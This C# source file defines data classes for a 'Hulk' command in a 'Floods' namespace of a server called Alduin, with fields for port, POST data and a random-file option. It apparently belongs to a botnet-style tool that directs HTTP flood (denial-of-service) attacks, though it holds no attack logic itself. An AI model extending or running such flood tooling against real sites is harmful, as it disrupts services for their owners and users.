using System;
using System.Collections.Generic;
using System.Text;

namespace Alduin.Server.Commands.Floods
{
    public class HulkCommand
    {
        public HulkVariables newHulkVariables { get; set; }
        public BaseCommands newBaseCommand { get; set; }
        public BaseFloodModel newBaseFloodModel { get; set; }
    }

    public class HulkVariables
    {
        public int Port { get; set; }
        public string PostDATA { get; set; }
        public bool RandomFile { get; set; }
    }
}
